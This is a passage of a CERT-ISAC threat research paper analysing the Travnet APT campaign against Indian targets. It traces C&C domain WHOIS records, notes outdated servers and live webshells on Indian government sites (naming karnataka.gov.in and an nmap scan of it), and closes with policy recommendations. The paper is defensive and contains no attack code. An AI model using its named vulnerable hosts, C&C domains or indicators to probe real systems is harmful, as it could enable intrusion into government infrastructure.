+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+It was apparently created on 20-march-2009 & its expiration date was set to 20-march-2013. The registrant's 
+
+information at that time was as follows: 
+
+ 
+
+ 
+
+The above data seems familiar. The only difference now being that the domains have be renewed, registration 
+
+details kept private & the email ID of the registrant has changed from “livep92@hotmail.com” to 
+
+“chenjm@sina.com”, which belongs to a private Chinese mail service    (http://mail.sina.com.cn/) . The same thing 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+has happened with other publicly disclosed Travnet C&C domains. We also fetched details of another domain 
+
+that previously hosted Travnet C&C & has been recently renewed, most likely by the same group.     
+
+A search for the email “livep92@hotmail.com” led us to the following page : 
+
+ 
+
+ 
+
+The above listed domains are already known to have hosted the Travnet C&C. We did some research on the 
+
+current status of one of the domains from the above list, “discoverypeace.org”. The current WHOIS data for the 
+
+domain “discoverypeace.org” is as follows: 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+ 
+
+This looks strikingly similar to the current status of the active C&C domain “pkstring.net”. It was also recently 
+
+updated. The older WHOIS entry for the same domain was as follows : 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Conclusion of Travnet Analysis: 
+ 
+
+From our analysis of the Travnet malware so far, it’s quite evident that many things hint at the origin of this 
+
+campaign to be from China. It’s also a known fact the Indian government & other important sectors from India 
+
+were heavily targeted during this campaign. T 
+
+The fact that this was a highly targeted attack & focused on stealing confidential documents & sensitive 
+
+information makes it noteworthy.   
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+   
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+PART THREE: 
+
+ 
+
+PRIMARY CAUSES 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+ 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+PART THREE: PRIMARY CAUSES 
+
+What are the primary causes of weak Indian Cyber Space? 
+
+Use of Outdated Software on Government Websites 
+ 
+
+Another  interesting  finding  is  the  fact  that  many  of  the  servers  that  host  “gov.in”  sites  are  running  outdated 
+
+software versions.   
+
+As an example, from the above image, it is evident that the domain “karnataka.gov.in” is hosted on a server running 
+
+“Windows Server 2003”, on 22-June-2013. To confirm this, we ran an nmap scan & it’s not surprising to find out 
+
+that the information is true. The screenshot of our nmap scan is as follows: 
+
+ 
+
+ 
+
+While use of outdated software is one of the major concerns, it seems most of the Indian government sites are 
+
+riddled with vulnerable code too. It’s quite common to locate webshells on these sites.   
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+ 
+
+Webshells on Indian Websites   
+One of the many live webshells we found recently during our analysis is shown in the following image: 
+
+ 
+
+ 
+
+From the time-stamps on the above image, it’s evident that this is webshell is still active at the time of this this 
+
+writing. An example of a government site that’s not properly managed & discloses highly sensitive information is 
+
+as follows: 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+The above screenshot is just one of the many live examples of poorly managed web servers that do not follow 
+
+even the most basic web application security guidelines. Even important government sites, access to which can 
+
+lead to much deeper intrusion seem to be managed with little care. The following image is just one of the 
+
+examples of developing or customizing a CMS & not properly handling access-control. 
+
+ 
+
+ 
+
+While defacements are usually carried out by hackers just for fun or fame, in a way its a boon in disguise. Serious 
+
+hackers can cause much more damage & remain unnoticed for a very long time by having access to the 
+
+privileges these hackers abuse to deface the site. Slowly but steadily, serious APT campaigns are on the rise. Its 
+
+very important for the nation to start upgrading its IT infrastructure & keep up with the latest security guidelines 
+
+& practices. The next part of this research paper focuses on a recent APT campaign against multiple countries 
+
+including India was targeted. 
+
+ 
+
+While each and every technical cause for weak Indian Cyber space is beyond the scope of this document, we also 
+
+believe that India requires a strong policy driven approach along with inspiring leadership from thought leaders 
+
+and Government departments in Information security to bring the much needed change. 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+PART FOUR: 
+
+ 
+
+RECOMMENDATIONS 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+ 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+PART FOUR: RECOMMENDATIONS 
+
+We recommend the following 
+
+Policy on Domain Name acquisition, management & maintenance 
+The Domain name acquisition, management and maintenance policy should address the process to protect and 
+
+manage the crucial online identities of Indian Government Domains. At present there is no consistent policy to 
+
+acquire and manage the domains. The policy should address: 
+
+1.  Naming convention to be followed for official Government domains to prevent misuse by domain 
+
+squatters 
+
+2.  A Government body that is responsible to register, administer and manage the domains 
+
+3.  Consistent working administrative and management contacts for WHOIS query 
+
+4.  Systematic policy to acquire domains and renew them on timely basis 
+
+5.  A policy to ensure “Domain Authorization keys” are managed properly and maintained in proper chain of 
+
+custody, secured in a bank locker and handled with systematic process 
+
+Policy on Vendor qualification for secure website development 
+It is crucial to select the right vendors for developing security websites and web applications for all Government 
+
+projects. The policy should address: 
+
+1.  Qualification parameters for selection of vendor for web site and web application development 
+
+2.  Certified Staff by vendor working on Government projects for Information security and secure coding 
+
+3.  Quarterly vulnerability assessment and penetration testing of all websites 
+
+4.  Security Classification of websites that determine parameters of vendor approval 
+
+5.  Comprehensive development and support contract from vendor that covers data security and associated 
+
+penalties in event of breach 
+
+ 
+
+Policy on Patch Management 
+While it is possible that such a policy exits with organizations such as NIC, it is important to ensure these are 
+
+implemented in a timely manner. The policy on patch management must ensure outdated software must be 
+
+secured appropriately and updated as per Industry standards. The policy must address: 
+
+1.  Adequate test bed environment for testing new updates for software, patches etc 
+
+2.  Comprehensive UAT (User Acceptance Testing) before implementation of critical security patches 
+
+3.  Policy to ensure critical security updates are deployed within a specified time from date of release 
+
+4.  Backup of data and roll back methodologies in event of patch deployment issues 
+
+5.  Monitoring of critical updates and patches and appropriate classification of the same for deployment 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Policy, Process and Guidelines on Full disclosures 
+India has a strong community of Information security experts who can support the Indian Government and 
+strengthen overall security of our cyber space. As the nature of such community is dynamic and rapidly evolving, it is 
+important for the Indian Government to setup a policy and process for responsible full disclosures when Indian 
+citizens report possible vulnerabilities in critical digital assets of India. These must address: 
+
+1.  Process by which any citizen of India can safely submit and report vulnerabilities, full disclosures in Indian 
+
+websites to an authorized agency without fearing action of IT Act law   
+
+2.  Guidelines under which, the security experts from the Indian community can communicate, assist and 
+
+support law enforcement and responsible agencies in effectively addressing security gaps in Indian Cyber 
+space. 
+
+3.  Process to act on security incidents reported by the security community in a timely manner. 
+4.  Guidelines to industry at large on how to cooperate with security experts who disclose security issues in 
+
+their organizations 
+
+5.  Guidelines to the citizens on being Cyber aware and how to help the Government in securing the economy 
+
+of the country from malicious hackers 
+
+Role of National Security Database 
+National  Security  Database  (NSD)  is  a  prestigious  empanelment  program  awarded  to  credible  &  trustworthy 
+Information  security  experts  with  proven  skills  to  protect  the  National  Critical  Infrastructure  &  economy  of  the 
+country. 
+
+The National Security Database project has been generously endorsed and supported by NTRO and CERT and has been 
+playing an important role in raising the cyber safety awareness across the Nation as well as engaging the community 
+in improving the overall cyber space of India.   
+
+We sincerely believe that in coming years, the program will create a strong and credible cyber workforce that can 
+
+help the Indian Government in both offense and defence of its Cyber Space. 
+
+References: 
+ 
+
+http://www.securelist.com/en/downloads/vlpdfs/kaspersky-the-net-traveler-part1-final.pdf 
+
+http://blogs.mcafee.com/mcafee-labs/travnet-botnet-controls-victims-with-remote-admin-tool 
+
+https://www.virustotal.com/en/ip-address/182.50.130.68/information/ 
+
+http://www.threatexpert.com/report.aspx?md5=0f23c9e6c8ec38f62616d39de5b00ffb 
+
+http://www.deccanchronicle.com/130608/news-current-affairs/article/india-loses-22gb-data-cyber-attack 
+
+http://newindianexpress.com/nation/Cyber-defences-are-not-robust-enough/2013/06/16/article1636933.ece 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+
